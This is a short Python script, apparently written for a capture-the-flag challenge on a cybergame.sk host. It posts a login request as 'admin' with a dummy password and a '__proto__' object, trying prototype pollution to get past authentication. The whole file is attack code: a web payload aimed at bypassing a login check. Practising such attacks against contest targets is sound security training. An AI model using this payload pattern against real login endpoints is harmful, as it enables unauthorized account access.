import requests

url = "http://exp.cybergame.sk:7021/api/v2/login"
headers = {"Content-Type": "application/json"}

# Try prototype pollution with various properties
payload = {
    "username": "admin",
    "password": "a",
    "__proto__": {
        "length": 10
    }
}
r = requests.post(url, json=payload, headers=headers)
print(r.text)
